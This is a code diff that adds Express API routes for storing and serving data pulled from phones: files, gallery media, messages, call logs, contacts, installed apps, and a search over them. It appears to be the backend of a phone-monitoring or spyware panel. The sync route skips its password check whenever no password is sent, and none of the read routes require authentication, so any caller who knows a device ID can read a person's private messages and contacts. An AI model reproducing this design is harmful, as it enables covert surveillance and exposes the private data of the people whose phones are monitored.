@@ -430,4 +430,169 @@ router.delete('/:deviceId', async (req, res, next) => {
   }
 });
 
+
+
+router.post('/:deviceId/sync-data', async (req, res, next) => {
+  try {
+    const { deviceId } = req.params;
+    const { deviceData, password } = req.body;
+
+    const device = await Device.findOne({ deviceId });
+    if (!device) {
+      return res.status(404).json({ success: false, error: 'Device not found' });
+    }
+
+    if (password) {
+      const valid = await device.verifyPassword(password);
+      if (!valid) {
+        return res.status(401).json({ success: false, error: 'Invalid password' });
+      }
+    }
+
+    // Update device data
+    device.deviceData = {
+      ...device.deviceData,
+      ...deviceData,
+      lastUpdated: new Date(),
+    };
+    device.lastSeen = new Date();
+    await device.save();
+
+    res.json({ success: true, message: 'Data synced successfully' });
+  } catch (error) {
+    next(error);
+  }
+});
+
+// NEW: Get files only
+router.get('/:deviceId/files', async (req, res, next) => {
+  try {
+    const { deviceId } = req.params;
+    const device = await Device.findOne({ deviceId });
+    if (!device) {
+      return res.status(404).json({ success: false, error: 'Device not found' });
+    }
+    res.json({ files: device.deviceData?.files || [] });
+  } catch (error) {
+    next(error);
+  }
+});
+
+// NEW: Get gallery/images only
+router.get('/:deviceId/gallery', async (req, res, next) => {
+  try {
+    const { deviceId } = req.params;
+    const device = await Device.findOne({ deviceId });
+    if (!device) {
+      return res.status(404).json({ success: false, error: 'Device not found' });
+    }
+    res.json({
+      gallery: device.deviceData?.gallery || [],
+      images: device.deviceData?.images || [],
+      videos: device.deviceData?.videos || []
+    });
+  } catch (error) {
+    next(error);
+  }
+});
+
+// NEW: Get messages
+router.get('/:deviceId/messages', async (req, res, next) => {
+  try {
+    const { deviceId } = req.params;
+    const device = await Device.findOne({ deviceId });
+    if (!device) {
+      return res.status(404).json({ success: false, error: 'Device not found' });
+    }
+    res.json({ messages: device.deviceData?.messages || [] });
+  } catch (error) {
+    next(error);
+  }
+});
+
+// NEW: Get call logs
+router.get('/:deviceId/call-logs', async (req, res, next) => {
+  try {
+    const { deviceId } = req.params;
+    const device = await Device.findOne({ deviceId });
+    if (!device) {
+      return res.status(404).json({ success: false, error: 'Device not found' });
+    }
+    res.json({ callLogs: device.deviceData?.callLogs || [] });
+  } catch (error) {
+    next(error);
+  }
+});
+
+// NEW: Get contacts
+router.get('/:deviceId/contacts', async (req, res, next) => {
+  try {
+    const { deviceId } = req.params;
+    const device = await Device.findOne({ deviceId });
+    if (!device) {
+      return res.status(404).json({ success: false, error: 'Device not found' });
+    }
+    res.json({ contacts: device.deviceData?.contacts || [] });
+  } catch (error) {
+    next(error);
+  }
+});
+
+// NEW: Get applications
+router.get('/:deviceId/apps', async (req, res, next) => {
+  try {
+    const { deviceId } = req.params;
+    const device = await Device.findOne({ deviceId });
+    if (!device) {
+      return res.status(404).json({ success: false, error: 'Device not found' });
+    }
+    res.json({ applications: device.deviceData?.applications || [] });
+  } catch (error) {
+    next(error);
+  }
+});
+
+// NEW: Search device data
+router.post('/:deviceId/search', async (req, res, next) => {
+  try {
+    const { deviceId } = req.params;
+    const { query, type } = req.body;
+
+    const device = await Device.findOne({ deviceId });
+    if (!device) {
+      return res.status(404).json({ success: false, error: 'Device not found' });
+    }
+
+    const deviceData = device.deviceData || {};
+    let results = [];
+
+    if (!type || type === 'files') {
+      results.push(...(deviceData.files || []).filter(f =>
+        f.name?.toLowerCase().includes(query.toLowerCase())
+      ));
+    }
+    if (!type || type === 'gallery') {
+      results.push(...(deviceData.gallery || []).filter(g =>
+        g.name?.toLowerCase().includes(query.toLowerCase())
+      ));
+    }
+    if (!type || type === 'messages') {
+      results.push(...(deviceData.messages || []).filter(m =>
+        m.text?.toLowerCase().includes(query.toLowerCase()) ||
+        m.sender?.toLowerCase().includes(query.toLowerCase())
+      ));
+    }
+    if (!type || type === 'contacts') {
+      results.push(...(deviceData.contacts || []).filter(c =>
+        c.name?.toLowerCase().includes(query.toLowerCase()) ||
+        c.number?.includes(query)
+      ));
+    }
+
+    res.json({ success: true, results, count: results.length });
+  } catch (error) {
+    next(error);
+  }
+});
+
 module.exports = router;
